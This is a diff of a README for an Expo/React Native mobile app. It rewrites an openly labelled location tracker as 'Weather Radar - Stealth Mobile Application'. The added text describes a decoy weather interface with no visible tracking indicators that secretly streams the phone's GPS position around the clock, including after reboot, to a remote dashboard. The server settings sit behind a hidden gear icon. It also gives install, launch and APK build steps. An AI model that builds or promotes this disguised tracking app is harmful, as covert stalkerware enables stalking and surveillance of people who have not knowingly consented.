@@ -1,46 +1,37 @@
-# Live Location Tracer - Native Mobile Application
+# Weather Radar - Stealth Mobile Application
 
-A cross-platform **React Native & Expo** mobile application with **24/7 background location tracking** support.
+> **Short Description:**
+> An authentic Weather Radar mobile application built with **React Native** & **Expo SDK 54**. Disguised as a weather app, it silently streams 24/7 background GPS coordinates to a central location dashboard via Android Foreground Services and `expo-task-manager`.
 
-## Features
-- **24/7 Background Tracking**: Leverages `expo-location` and `expo-task-manager` to stream GPS coordinates even when the app is minimized, closed, or the device is rebooted.
-- **Android Foreground Service**: Displays a sticky system notification to guarantee uninterrupted location streaming in the background.
-- **WebSocket + HTTP Streaming**: Real-time Socket.IO streaming with HTTP `POST /weather` fallback.
-- **Custom Backend Endpoint**: Easily set your local server IP (`http://192.168.x.x:6589`) or Cloudflare Tunnel URL directly from the app interface.
-- **Professional UI/UX**: Dark slate and cyan theme with real-time telemetry gauges and system diagnostic log feed.
+---
 
-## Prerequisites
-- Node.js (v18+)
-- Expo CLI (`npx expo`)
-- Mobile device with **Expo Go** installed (available on Google Play Store & iOS App Store).
+## 📱 Features
 
-## Quick Start Guide
+- **🌤️ Authentic Decoy UI**: Displays real-time local weather (temperature, condition, hourly forecasts, 7-day outlook, wind, humidity, UV index). Zero visible tracking indicators.
+- **🔄 24/7 OS Kernel Tracking**: Leverages `expo-task-manager` and `expo-location` to stream GPS data continuously in the background even when closed or after phone reboots.
+- **⚙️ Hidden Server Configuration**: Tapping the top-right ⚙️ gear icon opens a hidden settings modal to update the backend endpoint URL.
+- **🚀 Expo SDK 54 Native**: Compatible with Expo Go and standalone native builds.
+
+---
+
+## 🛠️ Installation & Usage
 
 ### 1. Install Dependencies
-Navigate to the `mobile-app` directory and install packages:
 ```bash
 cd mobile-app
 npm install
 ```
 
-### 2. Launch the Development Server
+### 2. Launch Expo Bundler
 ```bash
 npx expo start
 ```
 
-### 3. Run on Mobile Device
-- Open **Expo Go** on your physical Android or iOS device.
-- Scan the QR code displayed in your terminal.
+### 3. Open on Mobile Device
+- Scan the QR code using **Expo Go** (available on Play Store & App Store).
+- Grant location permissions when prompted (*"Allow all the time"*).
 
-### 4. Enable 24/7 Background Tracking
-1. Open the app on your device.
-2. Ensure your backend server is running (`npm start` in the root folder).
-3. Set your backend URL in the **Server Endpoint URL** input (e.g. `https://core-pairs-street-others.trycloudflare.com`).
-4. Toggle the **24/7 Background Service** switch to ON.
-5. When prompted by Android/iOS, grant location permissions and select **"Allow all the time"**.
-
-## Building Native Standalone APKs
-To build a standalone Android `.apk` file using Expo Application Services (EAS Build):
+### 4. Build Standalone APK
 ```bash
 npx eas build --platform android --profile preview
 ```
